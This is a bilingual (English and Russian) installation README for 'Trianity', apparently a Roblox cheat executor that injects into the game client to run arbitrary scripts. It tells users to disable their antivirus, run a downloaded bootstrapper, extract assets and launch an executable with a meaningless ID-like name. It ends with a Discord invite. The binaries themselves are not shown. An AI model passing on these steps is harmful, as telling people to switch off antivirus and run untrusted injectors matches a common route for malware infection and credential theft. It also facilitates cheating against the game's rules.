Requests: https://dotnet.microsoft.com/en-us/download/dotnet/8.0
Translate
Нужно установить: https://dotnet.microsoft.com/en-us/download/dotnet/8.0


Step 1 - Disable your antivirus software as it can cause problems with downloading files and injecting.
Step 2 - Open the file "TrianityBootstrapperV0.3.0.exe".
Step 3 - After the downloading has finished, go to the "Assets" folder and extract all of the files anywhere you want.
Step 4 - After extracting has finished, open the file "445e-1435-1244-2354-7a45.exe".
Step 5 - Create a new tab.
Step 6 - Open the Roblox app and press the button that says "Inject".
Step 7 - Join any Roblox game.
Step 8 - After you fully load in, paste your preferred script, press "Execute" and enjoy!
--- Thank you for using our executor.

--- Having issues, errors or want to report a bug?
Join our discord server! - discord.gg/t8VYa6bUJ7 (or click the Discord button in the executor)

Known issues:
Bootstrapper closing instantly after opening.
Fix - delete the "Assets" folder and open the bootstrapper again.



Translate
#Туториал на скачку
шаг 1 - отключите свой антивирус это может вызывать проблемы при инжекте.
шаг 2 - запустите "TrianityBootstrapperV0.3.0.exe"
шаг 3 - после скачки зайдите в папку "Assets" и распакуйте все что там есть.
шаг 4 - после распаковки архива запустите "445e-1435-1244-2354-7a45.exe"
шаг 5 - Создайте новый таб.
шаг 6 - откройте роблокс и кликните "Inject" кнопку.
шаг 7 - зайдите в игру.
шаг 8 - после полной загрузки вставьте скрипт и нажмите кнопку "Execute"
готово!

появляются ошибки?
зайдите в наш дискорд сервер.
discord.gg/t8VYa6bUJ7 или кликните дискорд иконку в 445e-1435-1244-2354-7a45.exe

-- спасибо за использование нашего эксплоита!

-- загрузчик сразу закрывается? попробуйте удалить "Assets" папку и это должно починиться.
